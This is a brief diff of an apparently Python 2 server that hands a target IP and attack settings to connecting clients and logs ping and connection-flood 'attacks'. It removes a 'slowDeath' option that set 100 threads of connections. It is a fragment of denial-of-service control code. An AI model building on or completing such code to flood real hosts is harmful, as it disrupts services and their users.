@@ -17,7 +17,6 @@ global ping_time
 ipAdd ='192.168.4.161'
 numPing = 5
 ping_time = "2013-03-27-21-05-0"
-threads = 100
 
 def handler(clientsock,addr):
 	while 1:
@@ -62,12 +61,6 @@ def handler(clientsock,addr):
 				clientsock.send(str(ping_time))
 				print >>sys.stderr, 'Attacked %s with %s Pings' % (ipAdd, numPing)
 				break
-			elif data == slowDeath:
-				clientsock.send(ipAdd)
-				time.sleep(1)
-				clientsock.send(threads)
-				time.sleep(1)
-				print >>sys.stderr, 'Attacked %s with %s Threads of Connections' % (ipAdd, threads)
 			else:
 				print >>sys.stderr, 'Invalid Access From: ', clientsock
 				break
